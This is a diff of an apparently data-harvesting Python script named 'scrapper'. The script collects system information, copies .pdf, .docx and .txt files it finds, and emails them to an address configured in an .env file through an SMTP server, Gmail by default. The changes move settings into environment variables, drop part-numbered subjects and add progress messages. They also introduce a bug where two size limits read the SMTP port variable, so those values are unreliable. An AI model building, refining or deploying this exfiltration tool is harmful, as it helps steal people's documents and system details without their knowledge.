@@ -14,13 +14,13 @@ from email.mime.application import MIMEApplication
 enable_email = os.getenv("enable_email", "false").lower()
 
 # Provide email configuration (replace with actual values)
-sender_email = "johndoe029501@gmail.com"
+sender_email = os.getenv("sender_email", "")
 receiver_email = os.getenv("receiver_email", "") # Needs to be filled in within .env file
 password = os.getenv("password", "") # Needs to be filled in within .env file (app specific password)
-smtp_server = "smtp.gmail.com"
-smtp_port = 587
-max_attachment_size_mb = 25  # Gmail attachment size limit in MB
-max_copy_amount = 25 # Max amount of files to copy in MB
+smtp_server = os.getenv("smtp_server", "smtp.gmail.com")
+smtp_port = int(os.getenv("smtp_port", 587))
+max_attachment_size_mb = int(os.getenv("smtp_port", 25))  # Gmail attachment size limit in MB
+max_copy_amount = int(os.getenv("smtp_port", 25)) # Max amount of files to copy in MB
 
 def get_os_info():
     return platform.platform()
@@ -102,7 +102,6 @@ def send_email(sender_email, receiver_email, password, smtp_server, smtp_port, m
         print(f"Failed to send email: {e}")
 
 def send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, subject, system_info_path):
-    part_number = 1
     total_size = 0
     email_count = 0
     message = None
@@ -118,7 +117,7 @@ def send_email_with_attachments(sender_email, receiver_email, password, smtp_ser
             message = MIMEMultipart()
             message["From"] = sender_email
             message["To"] = receiver_email
-            message["Subject"] = f"{subject} - Part {part_number}"
+            message["Subject"] = subject
             message.attach(MIMEText("Please find attached the system information report along with any .pdf, .docx, or .txt files found on the system.", "plain"))
 
         if not system_info_added:
@@ -135,7 +134,6 @@ def send_email_with_attachments(sender_email, receiver_email, password, smtp_ser
             send_email(sender_email, receiver_email, password, smtp_server, smtp_port, message)
             email_count += 1
             total_size = 0
-            part_number += 1
             message = None
 
         if message:
@@ -229,10 +227,12 @@ def scrapper():
         # Prepare attachments from copied_files directory
         copied_files_dir = os.path.join(script_dir, 'copied_files')
         system_info_dir =  os.path.join(script_dir, 'system_info.txt')
+        print("Preparing attachments...")
         attachments = prepare_attachments(copied_files_dir)
 
         if not attachments:
             # No attachments to send, just send the system_info.txt
+            print("No attachments found, sending single email with system_info.txt")
             attachments = [{"path": system_info_dir, "size": os.path.getsize(system_info_dir)}]
         
         send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, "System Information Report", system_info_dir)
